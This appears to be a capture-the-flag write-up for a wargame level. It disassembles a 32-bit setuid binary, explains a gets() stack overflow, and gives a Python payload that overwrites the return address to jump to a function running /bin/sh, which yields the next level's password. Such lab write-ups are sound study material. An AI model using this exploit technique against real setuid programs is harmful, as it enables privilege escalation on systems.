# LEVEL 1

$ objdup -d -Mintel level1
```asm
08048444 <run>:

08048472 <run + 2e>:
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>

08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave
 8048496:	c3                   	ret
```
The `main` function is declaring 80 bytes of stack, after ANDing the stack pointer with ~0xF.   
This particular operation has for effect to clear the low half of the LSB from the stack pointer,
thus rounding it to the preceding multiple of 16. With the 32 bit architecture we're working on,
it can only sub either 0, 4, 8 or 12 from this value. We will call this value `ROUND` from now

The `gets` function does not have bounds checking on user input, and it is called at `[esp + 0x10]`,
offering us a "legal" buffer of 64 bytes + `ROUND`. By trying the 4 different values of `ROUND`, we
came to the conclusion that it was equal to 8, effectively adding 8 bytes of space between the
buffer and the pair `{old ebp, return address}`.

We have a `run` function at address `0x08048444`, that calls `system` using the string at address
`0x8048584`. Using gdb we can check what's the value of the string.
```bash
(gdb) p (char *) 0x8048584
$1 = 0x8048584 "/bin/sh"
```
So the `run` function is launching a shell from a setuid `level2` program.   
To exploit this, we need to fill the buffer in order to overwrite the return address of `main`.   
As said, there is 72 bytes of stack before the old_ebp, so 76 bytes before the return address.
The final payload that is sent to the binary is then 76 bytes of padding, followed by the `run`
function address.
```python
PADDING = 76
RUN_ADDR = 0x08048444

payload = b"\x90" * PADDING
payload += p32(RUN_ADDR)
```
This opens a shell and allows us to cat the next level password.
